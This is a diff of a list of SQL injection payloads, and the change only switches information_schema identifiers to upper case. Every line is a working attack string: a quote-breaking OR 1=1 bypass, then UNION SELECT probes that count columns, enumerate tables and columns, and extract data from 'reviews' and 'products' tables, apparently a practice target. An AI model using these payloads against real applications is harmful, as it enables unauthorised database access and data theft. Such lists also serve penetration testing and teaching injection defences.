@@ -1,12 +1,12 @@
 1
 '
 ' OR 1=1-- 
-' UNION SELECT NULL FROM information_schema.columns-- 
-' UNION SELECT NULL, NULL FROM information_schema.columns-- 
-' UNION SELECT NULL, NULL, NULL FROM information_schema.columns-- 
-' UNION SELECT table_name, NULL, NULL FROM information_schema.columns-- 
-' UNION SELECT table_name, NULL, NULL FROM information_schema.columns-- 
-' UNION SELECT table_name, column_name, NULL FROM information_schema.columns-- 
+' UNION SELECT NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
+' UNION SELECT NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
+' UNION SELECT NULL, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
+' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
+' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
+' UNION SELECT TABLE_NAME, COLUMN_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
 ' UNION SELECT name, review, NULL FROM reviews-- 
 ' UNION SELECT productCode, NULL, NULL FROM reviews-- 
 ' UNION SELECT name, productCode, NULL FROM reviews-- 
@@ -17,4 +17,4 @@
 ' UNION SELECT productVendor, productDescription, NULL FROM products-- 
 ' UNION SELECT quantityInStock, buyPrice, NULL FROM products-- 
 ' UNION SELECT MSRP, NULL, NULL FROM products-- 
-' UNION SELECT column_name, data_type, NULL FROM information_schema.columns-- 
+' UNION SELECT COLUMN_NAME, DATA_TYPE, NULL FROM INFORMATION_SCHEMA.COLUMNS-- 
